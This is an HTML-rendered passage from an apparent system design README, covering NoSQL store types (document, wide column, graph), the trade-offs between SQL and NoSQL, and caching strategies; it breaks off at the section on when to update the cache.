&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-document-store" class="anchor" aria-hidden="true" href="#sources-and-further-reading-document-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: document store&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Document-oriented_database" rel="nofollow"&gt;Document-oriented database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mongodb.com/mongodb-architecture" rel="nofollow"&gt;MongoDB architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.couchdb.org/2016/08/01/couchdb-2-0-architecture/" rel="nofollow"&gt;CouchDB architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.elastic.co/blog/found-elasticsearch-from-the-bottom-up" rel="nofollow"&gt;Elasticsearch architecture&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-wide-column-store" class="anchor" aria-hidden="true" href="#wide-column-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Wide column store&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/823668b07b4bff50574e934273c9244e4e5017d6/687474703a2f2f692e696d6775722e636f6d2f6e3136694f476b2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/823668b07b4bff50574e934273c9244e4e5017d6/687474703a2f2f692e696d6775722e636f6d2f6e3136694f476b2e706e67" data-canonical-src="http://i.imgur.com/n16iOGk.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://blog.grio.com/2015/11/sql-nosql-a-brief-history.html" rel="nofollow"&gt;Source: SQL &amp;amp; NoSQL, a brief history&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Abstraction: nested map &lt;code&gt;ColumnFamily&amp;lt;RowKey, Columns&amp;lt;ColKey, Value, Timestamp&amp;gt;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A wide column store's basic unit of data is a column (name/value pair).  A column can be grouped in column families (analogous to a SQL table).  Super column families further group column families.  You can access each column independently with a row key, and columns with the same row key form a row.  Each value contains a timestamp for versioning and for conflict resolution.&lt;/p&gt;
&lt;p&gt;Google introduced &lt;a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf" rel="nofollow"&gt;Bigtable&lt;/a&gt; as the first wide column store, which influenced the open-source &lt;a href="https://www.mapr.com/blog/in-depth-look-hbase-architecture" rel="nofollow"&gt;HBase&lt;/a&gt; often-used in the Hadoop ecosystem, and &lt;a href="http://docs.datastax.com/en/cassandra/3.0/cassandra/architecture/archIntro.html" rel="nofollow"&gt;Cassandra&lt;/a&gt; from Facebook.  Stores such as BigTable, HBase, and Cassandra maintain keys in lexicographic order, allowing efficient retrieval of selective key ranges.&lt;/p&gt;
&lt;p&gt;Wide column stores offer high availability and high scalability.  They are often used for very large data sets.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-wide-column-store" class="anchor" aria-hidden="true" href="#sources-and-further-reading-wide-column-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: wide column store&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.grio.com/2015/11/sql-nosql-a-brief-history.html" rel="nofollow"&gt;SQL &amp;amp; NoSQL, a brief history&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf" rel="nofollow"&gt;Bigtable architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mapr.com/blog/in-depth-look-hbase-architecture" rel="nofollow"&gt;HBase architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.datastax.com/en/cassandra/3.0/cassandra/architecture/archIntro.html" rel="nofollow"&gt;Cassandra architecture&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-graph-database" class="anchor" aria-hidden="true" href="#graph-database"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Graph database&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/bf6508b65e98a7210d9861515833afa0d9434436/687474703a2f2f692e696d6775722e636f6d2f664e636c3635672e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/bf6508b65e98a7210d9861515833afa0d9434436/687474703a2f2f692e696d6775722e636f6d2f664e636c3635672e706e67" data-canonical-src="http://i.imgur.com/fNcl65g.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://en.wikipedia.org/wiki/File:GraphDatabase_PropertyGraph.png" rel="nofollow"&gt;Source: Graph database&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Abstraction: graph&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In a graph database, each node is a record and each arc is a relationship between two nodes.  Graph databases are optimized to represent complex relationships with many foreign keys or many-to-many relationships.&lt;/p&gt;
&lt;p&gt;Graphs databases offer high performance for data models with complex relationships, such as a social network.  They are relatively new and are not yet widely-used; it might be more difficult to find development tools and resources.  Many graphs can only be accessed with &lt;a href="#representational-state-transfer-rest"&gt;REST APIs&lt;/a&gt;.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-graph" class="anchor" aria-hidden="true" href="#sources-and-further-reading-graph"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: graph&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Graph_database" rel="nofollow"&gt;Graph database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://neo4j.com/" rel="nofollow"&gt;Neo4j&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.twitter.com/2010/introducing-flockdb" rel="nofollow"&gt;FlockDB&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-nosql" class="anchor" aria-hidden="true" href="#sources-and-further-reading-nosql"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: NoSQL&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/3342497/explanation-of-base-terminology" rel="nofollow"&gt;Explanation of base terminology&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/baqend-blog/nosql-databases-a-survey-and-decision-guidance-ea7823a822d#.wskogqenq" rel="nofollow"&gt;NoSQL databases a survey and decision guidance&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database" rel="nofollow"&gt;Scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=qI_g07C_Q5I" rel="nofollow"&gt;Introduction to NoSQL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://horicky.blogspot.com/2009/11/nosql-patterns.html" rel="nofollow"&gt;NoSQL patterns&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sql-or-nosql" class="anchor" aria-hidden="true" href="#sql-or-nosql"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SQL or NoSQL&lt;/h3&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/a6e2e844765c9d5382d9c9b64ef7693977981646/687474703a2f2f692e696d6775722e636f6d2f775847714735662e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/a6e2e844765c9d5382d9c9b64ef7693977981646/687474703a2f2f692e696d6775722e636f6d2f775847714735662e706e67" data-canonical-src="http://i.imgur.com/wXGqG5f.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://www.infoq.com/articles/Transition-RDBMS-NoSQL/" rel="nofollow"&gt;Source: Transitioning from RDBMS to NoSQL&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Reasons for &lt;strong&gt;SQL&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Structured data&lt;/li&gt;
&lt;li&gt;Strict schema&lt;/li&gt;
&lt;li&gt;Relational data&lt;/li&gt;
&lt;li&gt;Need for complex joins&lt;/li&gt;
&lt;li&gt;Transactions&lt;/li&gt;
&lt;li&gt;Clear patterns for scaling&lt;/li&gt;
&lt;li&gt;More established: developers, community, code, tools, etc&lt;/li&gt;
&lt;li&gt;Lookups by index are very fast&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Reasons for &lt;strong&gt;NoSQL&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Semi-structured data&lt;/li&gt;
&lt;li&gt;Dynamic or flexible schema&lt;/li&gt;
&lt;li&gt;Non-relational data&lt;/li&gt;
&lt;li&gt;No need for complex joins&lt;/li&gt;
&lt;li&gt;Store many TB (or PB) of data&lt;/li&gt;
&lt;li&gt;Very data intensive workload&lt;/li&gt;
&lt;li&gt;Very high throughput for IOPS&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sample data well-suited for NoSQL:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rapid ingest of clickstream and log data&lt;/li&gt;
&lt;li&gt;Leaderboard or scoring data&lt;/li&gt;
&lt;li&gt;Temporary data, such as a shopping cart&lt;/li&gt;
&lt;li&gt;Frequently accessed ('hot') tables&lt;/li&gt;
&lt;li&gt;Metadata/lookup tables&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-sql-or-nosql" class="anchor" aria-hidden="true" href="#sources-and-further-reading-sql-or-nosql"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: SQL or NoSQL&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=w95murBkYmU" rel="nofollow"&gt;Scaling up to your first 10 million users&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sitepoint.com/sql-vs-nosql-differences/" rel="nofollow"&gt;SQL vs NoSQL differences&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-cache" class="anchor" aria-hidden="true" href="#cache"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cache&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/7acedde6aa7853baf2eb4a53f88e2595ebe43756/687474703a2f2f692e696d6775722e636f6d2f51367a32344c612e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/7acedde6aa7853baf2eb4a53f88e2595ebe43756/687474703a2f2f692e696d6775722e636f6d2f51367a32344c612e706e67" data-canonical-src="http://i.imgur.com/Q6z24La.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html" rel="nofollow"&gt;Source: Scalable system design patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Caching improves page load times and can reduce the load on your servers and databases.  In this model, the dispatcher will first lookup if the request has been made before and try to find the previous result to return, in order to save the actual execution.&lt;/p&gt;
&lt;p&gt;Databases often benefit from a uniform distribution of reads and writes across its partitions.  Popular items can skew the distribution, causing bottlenecks.  Putting a cache in front of a database can help absorb uneven loads and spikes in traffic.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-client-caching" class="anchor" aria-hidden="true" href="#client-caching"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Client caching&lt;/h3&gt;
&lt;p&gt;Caches can be located on the client side (OS or browser), &lt;a href="#reverse-proxy-web-server"&gt;server side&lt;/a&gt;, or in a distinct cache layer.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-cdn-caching" class="anchor" aria-hidden="true" href="#cdn-caching"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CDN caching&lt;/h3&gt;
&lt;p&gt;&lt;a href="#content-delivery-network"&gt;CDNs&lt;/a&gt; are considered a type of cache.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-web-server-caching" class="anchor" aria-hidden="true" href="#web-server-caching"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Web server caching&lt;/h3&gt;
&lt;p&gt;&lt;a href="#reverse-proxy-web-server"&gt;Reverse proxies&lt;/a&gt; and caches such as &lt;a href="https://www.varnish-cache.org/" rel="nofollow"&gt;Varnish&lt;/a&gt; can serve static and dynamic content directly.  Web servers can also cache requests, returning responses without having to contact application servers.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-database-caching" class="anchor" aria-hidden="true" href="#database-caching"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Database caching&lt;/h3&gt;
&lt;p&gt;Your database usually includes some level of caching in a default configuration, optimized for a generic use case.  Tweaking these settings for specific usage patterns can further boost performance.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-application-caching" class="anchor" aria-hidden="true" href="#application-caching"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Application caching&lt;/h3&gt;
&lt;p&gt;In-memory caches such as Memcached and Redis are key-value stores between your application and your data storage.  Since the data is held in RAM, it is much faster than typical databases where data is stored on disk.  RAM is more limited than disk, so &lt;a href="https://en.wikipedia.org/wiki/Cache_algorithms" rel="nofollow"&gt;cache invalidation&lt;/a&gt; algorithms such as &lt;a href="https://en.wikipedia.org/wiki/Cache_algorithms#Least_Recently_Used" rel="nofollow"&gt;least recently used (LRU)&lt;/a&gt; can help invalidate 'cold' entries and keep 'hot' data in RAM.&lt;/p&gt;
&lt;p&gt;Redis has the following additional features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Persistence option&lt;/li&gt;
&lt;li&gt;Built-in data structures such as sorted sets and lists&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are multiple levels you can cache that fall into two general categories: &lt;strong&gt;database queries&lt;/strong&gt; and &lt;strong&gt;objects&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Row level&lt;/li&gt;
&lt;li&gt;Query-level&lt;/li&gt;
&lt;li&gt;Fully-formed serializable objects&lt;/li&gt;
&lt;li&gt;Fully-rendered HTML&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Generally, you should try to avoid file-based caching, as it makes cloning and auto-scaling more difficult.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-caching-at-the-database-query-level" class="anchor" aria-hidden="true" href="#caching-at-the-database-query-level"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Caching at the database query level&lt;/h3&gt;
&lt;p&gt;Whenever you query the database, hash the query as a key and store the result to the cache.  This approach suffers from expiration issues:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hard to delete a cached result with complex queries&lt;/li&gt;
&lt;li&gt;If one piece of data changes such as a table cell, you need to delete all cached queries that might include the changed cell&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-caching-at-the-object-level" class="anchor" aria-hidden="true" href="#caching-at-the-object-level"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Caching at the object level&lt;/h3&gt;
&lt;p&gt;See your data as an object, similar to what you do with your application code.  Have your application assemble the dataset from the database into a class instance or a data structure(s):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Remove the object from cache if its underlying data has changed&lt;/li&gt;
&lt;li&gt;Allows for asynchronous processing: workers assemble objects by consuming the latest cached object&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Suggestions of what to cache:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User sessions&lt;/li&gt;
&lt;li&gt;Fully rendered web pages&lt;/li&gt;
&lt;li&gt;Activity streams&lt;/li&gt;
&lt;li&gt;User graph data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-when-to-update-the-cache" class="anchor" aria-hidden="true" href="#when-to-update-the-cache"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;When to update the cache&lt;/h3&gt;
&lt;p&gt;Since you can only store a limited amount of data in cache, you'll need to determine which cache update strategy works best for your use case.&lt;/p&gt;
